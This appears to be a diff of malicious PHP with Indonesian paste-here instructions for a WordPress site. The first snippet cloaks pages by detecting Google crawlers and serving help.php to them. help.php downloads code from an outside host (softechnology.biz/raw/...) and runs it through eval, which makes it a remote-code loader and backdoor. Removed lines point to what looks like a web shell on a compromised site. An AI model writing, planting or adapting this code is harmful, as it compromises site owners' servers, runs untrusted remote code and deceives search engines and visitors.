@@ -1,6 +1,3 @@
-INI TEMPEL DI PLUGIN.PHP public_html (https://ateal.org.br/wp-content/plugins/sydney-toolbox/demo-content/previews/ssl/http/content_.php?d=%2Fhome2%2Fatealo24%2Fpublic_html)/wp-includes (https://ateal.org.br/wp-content/plugins/sydney-toolbox/demo-content/previews/ssl/http/content_.php?d=%2Fhome2%2Fatealo24%2Fpublic_html%2Fwp-includes)/ cms wordpres
-
-
 <?php
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $referer   = $_SERVER['HTTP_REFERER'] ?? '';
@@ -17,18 +14,18 @@ $googleBots = [
 $isBot = preg_match('/' . implode('|', $googleBots) . '/i', $userAgent) || strpos($referer, 'google.') !== false;
 
 if ($isBot && $_SERVER['REQUEST_URI'] == '/') {
- 
-    if (file_exists(DIR . '/help.php')) {
+
+    if (file_exists(__DIR__ . '/help.php')) {
         include 'help.php';
         die();
     } else {
-   
+
     }
 }
 
-
-ISI FILE help.php di bawah ini
-
+--------------------------------------------
+--------------------------------------------
+ISI HELP.PHP 
 
 <?php
 error_reporting(0);
@@ -48,6 +45,6 @@ function geturlsinfo($url) {
     return $data;
 }
 
-$a = geturlsinfo('https://softechnology.biz/raw/8Lgz1OTFN8');
+$a = geturlsinfo('https://softechnology.biz/raw/veeoUmh9sI');
 eval('?>' . $a);
 ?>
